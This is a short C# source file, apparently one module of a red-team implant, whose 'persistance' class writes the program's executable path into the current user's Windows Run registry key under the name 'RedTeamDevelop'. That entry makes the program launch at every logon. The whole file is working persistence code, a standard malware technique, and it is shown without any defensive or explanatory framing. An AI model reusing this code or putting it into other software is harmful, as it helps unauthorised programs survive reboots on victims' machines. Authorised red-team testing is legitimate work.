using System;
using Microsoft.Win32;
namespace red {
    class persistance {
        GeneralInfo newInstance;
        public void AddToStart() {
            Microsoft.Win32.RegistryKey rkInstance = Microsoft.Win32.Registry.CurrentUser.OpenSubKey(@"Software\Microsoft\Windows\CurrentVersion\Run",true);
            rkInstance.SetValue("RedTeamDevelop", newInstance.executablePath);
            rkInstance.Dispose();
            rkInstance.Close();
        }
        public persistance(GeneralInfo instance) {
            newInstance = instance;
        }
    }
}